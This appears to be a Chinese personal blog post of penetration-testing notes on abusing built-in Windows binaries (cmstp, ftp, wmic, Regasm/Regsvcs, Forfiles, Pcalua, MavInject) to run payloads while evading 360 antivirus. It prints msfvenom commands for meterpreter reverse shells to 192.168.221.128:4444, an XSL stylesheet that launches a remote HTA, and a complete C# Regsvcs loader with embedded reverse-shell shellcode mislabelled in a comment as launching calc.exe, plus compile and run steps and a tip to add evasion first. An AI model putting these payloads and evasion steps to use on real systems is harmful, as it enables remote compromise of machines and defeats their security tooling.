<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs=RegisterOCXSection</span><br><span class="line">[RegisterOCXSection]</span><br><span class="line">C:\test\test.dll</span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Jasontt&quot;</span><br><span class="line">ShortSvcName=&quot;Jasontt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222202231220.png" alt="image-20220222202231220"></p>
<p>行为检测预警，dll文件直接被360杀毒删除</p>
<h3 id="执行cmd命令"><a href="#执行cmd命令" class="headerlink" title="执行cmd命令"></a>执行cmd命令</h3><p>cmstp.inf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs=RegisterOCXSection</span><br><span class="line">RunPreSetupCommands=RunPreSetupCommandsSection</span><br><span class="line">[RunPreSetupCommandsSection]</span><br><span class="line">c:\windows\system32\calc.exe</span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Jasontt&quot;</span><br><span class="line">ShortSvcName=&quot;Jasontt&quot;</span><br></pre></td></tr></table></figure>

<p>就是把<code>RegisterOCXSection</code>换成<code>RunPreSetupCommandsSection</code>，直接执行cmd命令</p>
<p>行为检测预警为cmstp攻击</p>
<h3 id="下载并解析远程inf文件"><a href="#下载并解析远程inf文件" class="headerlink" title="下载并解析远程inf文件"></a>下载并解析远程inf文件</h3><p>行为检测同样过不了。。。</p>
<h2 id="FTP-exe"><a href="#FTP-exe" class="headerlink" title="FTP.exe"></a>FTP.exe</h2><p>提供基本的FTP访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo !calc.exe &gt; ftpcommands.txt &amp;&amp; ftp -s:ftpcommands.txt</span><br></pre></td></tr></table></figure>



<p>不会触发行为监测，但是请求的可执行程序没有做好免杀还是会被360查杀</p>
<h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p>WMIC扩展<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/WMI">WMI</a>（Windows Management Instrumentation，Windows管理工具） ，提供了从<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A5%E5%8F%A3/18449233">命令行接口</a>和批命令脚本执行系统管理的支持</p>
<p>这个应该挺眼熟的，看过某些攻防类书籍一般会有这个</p>
<h3 id="远程加载payload"><a href="#远程加载payload" class="headerlink" title="远程加载payload"></a>远程加载payload</h3><p>生成一个hta文件</p>
<p>payload.xsl</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:ms</span>=<span class="string">&quot;urn:schemasmicrosoft-com:xslt&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">&quot;placeholder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> var r = new</span><br><span class="line">ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;http://192.168.221.128:8088/TyPHLB3I.hta&quot;);</span><br><span class="line"> ]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220222211320836.png" alt="image-20220222211320836"></p>
<p>执行后360预警wmic恶意命令执行攻击</p>
<h2 id="Regasm-exe-Regsvcs-exe"><a href="#Regasm-exe-Regsvcs-exe" class="headerlink" title="Regasm.exe/Regsvcs.exe"></a>Regasm.exe/Regsvcs.exe</h2><p>依赖环境：Microsoft.NET Framework v4.0.30319、Microsoft SDKs</p>
<p>Regsvcs和Regasm是Windows命令⾏实⽤程序，⽤于注册.NET组件对象模型(COM)程序集</p>
<p>生成C# shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f csharp</span><br></pre></td></tr></table></figure>

<p>regsvcs.cs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.EnterpriseServices;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Author: Casey Smith, Twitter: @subTee</span><br><span class="line">License: BSD 3-Clause</span><br><span class="line">Create Your Strong Name Key -&gt; key.snk</span><br><span class="line">$key = &#x27;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll </span><br><span class="line">[OR]</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll</span><br><span class="line">//Executes UnRegisterClass If you don&#x27;t have permissions</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll </span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll</span><br><span class="line">//This calls the UnregisterClass Method</span><br><span class="line">*/</span><br><span class="line">namespace regsvcser</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    public class Bypass : ServicedComponent</span><br><span class="line">    &#123;</span><br><span class="line">        public Bypass() &#123; Console.WriteLine(&quot;I am a basic COM Object&quot;); &#125;</span><br><span class="line">		</span><br><span class="line">		[ComRegisterFunction] //This executes if registration is successful</span><br><span class="line">		public static void RegisterClass ( string key )</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;I shouldn&#x27;t really execute&quot;);</span><br><span class="line">			Shellcode.Exec();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		[ComUnregisterFunction] //This executes if registration fails</span><br><span class="line">		public static void UnRegisterClass ( string key )</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;I shouldn&#x27;t really execute either.&quot;);</span><br><span class="line">			Shellcode.Exec();</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	public class Shellcode</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Exec()</span><br><span class="line">        &#123;</span><br><span class="line">            // native function&#x27;s compiled code</span><br><span class="line">            // generated with metasploit</span><br><span class="line">            // executes calc.exe</span><br><span class="line">            byte[] shellcode = new byte[354] &#123;</span><br><span class="line">0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,</span><br><span class="line">0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,</span><br><span class="line">0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,</span><br><span class="line">0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,</span><br><span class="line">0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,</span><br><span class="line">0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,</span><br><span class="line">0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,</span><br><span class="line">0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,</span><br><span class="line">0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,</span><br><span class="line">0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,</span><br><span class="line">0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,</span><br><span class="line">0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,</span><br><span class="line">0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0xdd,0x80,0x68,0x02,</span><br><span class="line">0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,</span><br><span class="line">0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,</span><br><span class="line">0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,</span><br><span class="line">0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,</span><br><span class="line">0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,</span><br><span class="line">0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,</span><br><span class="line">0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,</span><br><span class="line">0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,</span><br><span class="line">0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,</span><br><span class="line">0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,</span><br><span class="line">0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line">            // prepare data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // execute native code</span><br><span class="line"></span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line"></span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line"></span><br><span class="line">          UInt32 lpThreadAttributes,</span><br><span class="line">          UInt32 dwStackSize,</span><br><span class="line">          UInt32 lpStartAddress,</span><br><span class="line">          IntPtr param,</span><br><span class="line">          UInt32 dwCreationFlags,</span><br><span class="line">          ref UInt32 lpThreadId</span><br><span class="line"></span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line"></span><br><span class="line">          IntPtr hHandle,</span><br><span class="line">          UInt32 dwMilliseconds</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用<code>csc.exe</code>将cs文件生成为dll文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs</span><br></pre></td></tr></table></figure>

<p>msf配置好监听，Regasm.exe/Regsvcs.exe执行恶意dll文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe 1.dll</span><br><span class="line">或</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regsvcs.exe 1.dll</span><br></pre></td></tr></table></figure>

<h2 id="MavInject-exe"><a href="#MavInject-exe" class="headerlink" title="MavInject.exe"></a>MavInject.exe</h2><p>MavInject32.exe是微软应⽤程序虚拟化的⼀部分，可以直接完成向某⼀进程注⼊代码的功能</p>
<h2 id="Forfiles-exe"><a href="#Forfiles-exe" class="headerlink" title="Forfiles.exe"></a>Forfiles.exe</h2><p>Forfiles是⼀款windows平台默认安装的⽂件操作搜索⼯具之⼀，可以通过⽂件名称，修改⽇期等条件选择⽂件并运⾏⼀个命令来操作⽂件。它可以直接在命令⾏中使⽤，也可以在批处理⽂件或其他脚本中使⽤</p>
<p>生成msi payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.128 LPORT=4444 -f msi &gt; test.txt</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /p c:\windows\system32 /m cmd.exe /c &quot;msiexec.exe /q /i C:\test\test.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223094748821.png" alt="image-20220223094748821"></p>
<p>360直接报毒</p>
<h2 id="Pcalua-exe"><a href="#Pcalua-exe" class="headerlink" title="Pcalua.exe"></a>Pcalua.exe</h2><p>Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的⼀个组件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a exe/bat/dll </span><br></pre></td></tr></table></figure>

<p>测试过程中未做处理的木马没等运行就被删了，建议提前做点免杀处理</p>
<h2 id="presentationhost-exe"><a href="#presentationhost-exe" class="headerlink" title="presentationhost.exe"></a>presentationhost.exe</h2><p>Presentationhost.exe是⼀个内置的Windows可执⾏⽂件，⽤于运⾏XAML浏览器应⽤程序（即.xbap⽂件）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Presentationhost.exe C:\temp\Evil.xbap</span><br></pre></td></tr></table></figure>

<p>行为预警</p>
<h2 id="SyncAppvPublishingServer-vbs"><a href="#SyncAppvPublishingServer-vbs" class="headerlink" title="SyncAppvPublishingServer.vbs"></a>SyncAppvPublishingServer.vbs</h2><p>环境缺失</p>
<h2 id="MavInject32-exe"><a href="#MavInject32-exe" class="headerlink" title="MavInject32.exe"></a>MavInject32.exe</h2><p>MavInject32.exe是微软应⽤程序虚拟化的⼀部分，可以直接完成向某⼀进程注⼊代码的功能</p>
<p>使用方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MavInject32.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure>

<p>Win7中没有发现该文件，自己的Win10中也没找到，还得看具体情况</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这段时间主要是看重剑无锋师傅的远控免杀系列文章结合从网上搜到的各种资料来学习，现在顶多算入门水平</p>
<p>自己测试复现下来部分方法的免杀效果和文章中还是有出入，还有很多方法因为奇奇怪怪的问题没有复现成功，也发了几次邮件给作者请教还未得到答复，未来对于远控免杀技术有了更深的理解后可能会重新整理一遍这几篇小破文或者重写一遍</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>LOLBAS：<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/#">https://lolbas-project.github.io/#</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/22/Invoke-Obfuscation%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%AE%B0/" rel="prev" title="Invoke-Obfuscation工具小记">
                  <i class="fa fa-chevron-left"></i> Invoke-Obfuscation工具小记
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/23/Sqlmap-tamper/" rel="next" title="Sqlmap-tamper">
                  Sqlmap-tamper <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
